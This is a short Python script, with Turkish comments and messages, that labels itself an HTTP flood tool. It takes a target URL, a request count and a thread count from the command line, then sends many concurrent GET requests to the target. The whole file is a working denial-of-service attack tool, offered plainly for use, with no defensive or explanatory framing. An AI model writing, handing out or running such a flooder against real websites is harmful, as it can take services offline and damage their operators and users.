import argparse
import threading
import requests

def http_flood(target_url, request_count, thread_count):
    def send_request(request_number):
        try:
            requests.get(target_url)
            print(f"[+] Paket gönderildi {request_number}/{request_count}")
        except:
            print(f"[-] Hata! İstek {request_number}/{request_count} başarısız.")

    def worker():
        for i in range(request_count // thread_count):
            send_request(i + 1)

    threads = [threading.Thread(target=worker) for _ in range(thread_count)]
    for thread in threads:
        thread.start()
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="HTTP Flood Aracı")
    parser.add_argument("url", type=str, help="Hedef URL")
    parser.add_argument("count", type=int, help="İstek Sayısı")
    parser.add_argument("threads", type=int, help="Thread Sayısı")

    args = parser.parse_args()
    http_flood(args.url, args.count, args.threads)
